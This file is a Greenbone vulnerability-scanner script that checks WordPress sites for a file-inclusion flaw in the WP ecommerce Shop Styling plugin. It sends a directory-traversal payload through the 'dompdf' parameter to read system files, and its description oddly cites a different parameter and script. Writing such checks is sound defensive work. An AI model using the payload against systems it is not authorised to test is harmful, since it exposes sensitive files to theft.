# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804709");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2013-0724");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-07-07 12:27:51 +0530 (Mon, 07 Jul 2014)");
  script_name("WordPress WP ecommerce Shop Styling 'dompdf' Remote File Inclusion Vulnerability");

  script_tag(name:"summary", value:"WordPress WP ecommerce Shop Styling Plugin is prone to a remote
  file inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'id' HTTP GET parameter to /lp/index.php
  script is not properly sanitised before returning to the user.");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain sensitive
  information, which can lead to launching further attacks.");

  script_tag(name:"affected", value:"WordPress WP ecommerce Shop Styling Plugin version 1.7.2. Other
  versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 1.8 or later.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51707");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57768");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/81931");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file(keys(files)) {

  url = dir + '/wp-content/plugins/wp-ecommerce-shop-styling/includes/generate-pdf.php?dompdf=' + crap(data:"../", length:9*6) + files[file];

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
